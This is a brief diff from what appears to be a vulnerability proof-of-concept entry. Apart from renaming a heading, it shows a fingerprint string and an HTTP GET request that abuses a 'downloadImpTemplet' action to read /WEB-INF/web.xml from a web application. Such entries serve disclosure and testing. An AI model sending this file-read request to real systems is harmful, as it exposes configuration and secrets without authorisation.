@@ -8,7 +8,7 @@
 body="common/dep/dep/Core.js"
 ```
 
-## poc
+## POC
 ```
 GET /common/dep/common_dep.action.jsp?action=downloadImpTemplet&filePath=/WEB-INF/web.xml&fileName=12 HTTP/1.1
 Host: 
